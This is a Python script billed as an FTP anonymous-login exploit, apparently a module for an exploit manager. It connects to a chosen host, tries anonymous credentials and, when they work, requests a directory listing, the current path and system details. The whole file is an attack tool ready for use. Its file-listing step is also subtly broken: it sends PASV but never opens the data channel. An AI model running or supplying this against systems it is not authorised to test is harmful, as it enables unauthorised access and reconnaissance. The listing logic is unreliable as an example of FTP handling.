#!/usr/bin/env python3
"""
FTP Anonymous Login Exploit
- Real FTP connection
- Anonymous authentication attempt
- File listing capability
"""

import socket
import sys

def exploit_ftp(target, port=21):
    """
    Attempt anonymous FTP login and list files
    """
    try:
        print(f"[*] Connecting to {target}:{port}...")
        
        # Create socket connection
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10)
        sock.connect((target, port))
        
        # Receive banner
        banner = sock.recv(1024).decode('utf-8', errors='ignore').strip()
        print(f"[+] FTP Banner: {banner}")
        
        # Attempt anonymous login
        print("[*] Attempting anonymous login...")
        sock.send(b"USER anonymous\r\n")
        user_response = sock.recv(1024).decode('utf-8', errors='ignore').strip()
        print(f"[+] USER response: {user_response}")
        
        sock.send(b"PASS anonymous@\r\n")
        pass_response = sock.recv(1024).decode('utf-8', errors='ignore').strip()
        print(f"[+] PASS response: {pass_response}")
        
        # Check if login successful
        if "230" in pass_response:
            print("[SUCCESS] Anonymous login successful!")
            
            # Change to passive mode for data transfer
            sock.send(b"PASV\r\n")
            pasv_response = sock.recv(1024).decode('utf-8', errors='ignore')
            print(f"[+] PASV response: {pasv_response.strip()}")
            
            # List files
            print("[*] Attempting to list files...")
            sock.send(b"LIST\r\n")
            list_response = sock.recv(4096).decode('utf-8', errors='ignore')
            print(f"[+] Files listing:\n{list_response}")
            
            # Get current directory
            sock.send(b"PWD\r\n")
            pwd_response = sock.recv(1024).decode('utf-8', errors='ignore')
            print(f"[+] Current directory: {pwd_response.strip()}")
            
            # Try to get system info
            sock.send(b"SYST\r\n")
            syst_response = sock.recv(1024).decode('utf-8', errors='ignore')
            print(f"[+] System info: {syst_response.strip()}")
            
            result = "SUCCESS - Anonymous access granted"
            
        else:
            print("[FAILED] Anonymous login failed")
            result = "FAILED - Anonymous access denied"
        
        # Cleanup
        sock.send(b"QUIT\r\n")
        sock.close()
        return result
        
    except socket.timeout:
        print("[ERROR] Connection timeout")
        return "ERROR - Connection timeout"
    except ConnectionRefusedError:
        print("[ERROR] Connection refused")
        return "ERROR - Connection refused"
    except Exception as e:
        print(f"[ERROR] {e}")
        return f"ERROR - {e}"

def run_exploit(target):
    """
    Main function called by exploit manager
    """
    return exploit_ftp(target)

# Test if run directly
if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "192.168.1.100"
    print(f"Testing FTP anonymous exploit on {target}")
    result = exploit_ftp(target)
    print(f"Final result: {result}")
